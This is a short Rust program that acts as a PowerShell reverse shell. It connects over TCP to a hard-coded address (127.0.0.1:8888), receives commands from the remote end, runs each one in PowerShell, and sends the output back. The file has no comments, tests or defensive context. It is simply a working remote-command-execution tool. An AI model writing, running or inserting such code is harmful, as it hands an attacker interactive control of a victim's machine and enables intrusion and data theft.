use std::fmt::Debug;
use std::io::{Read, Write};
use std::net::TcpStream;
use powershell_script::PsScriptBuilder;

fn main() {
    let ip_address: String = String::from("127.0.0.1:8888");

    let ps = PsScriptBuilder::new()
        .no_profile(true)
        .non_interactive(true)
        .hidden(false)
        .print_commands(false)
        .build();

    match TcpStream::connect(&ip_address) {
        Ok(mut stream) => {
            println!("Successfully connected to {}", stream.peer_addr().unwrap());

            let mut buf = [0; 1024];
            loop {
                match stream.read(&mut buf) {
                    Ok(bytes_read) => {
                        if bytes_read == 0 {
                            break;
                        }
                        let command = std::str::from_utf8(&buf[..bytes_read]).unwrap();

                        match ps.run(command) {
                            Ok(result) => {
                                let output = result.stdout().unwrap();
                                stream.write(output.as_bytes()).unwrap();
                            }
                            Err(e) => {
                                stream.write(e.to_string().as_bytes()).unwrap();
                            }
                        }
                    }
                    Err(e) => {}
                }
            }
        }
        Err(e) => {
            println!("Error {}", e)
        }
    }

    eprintln!("Disconnected")
}
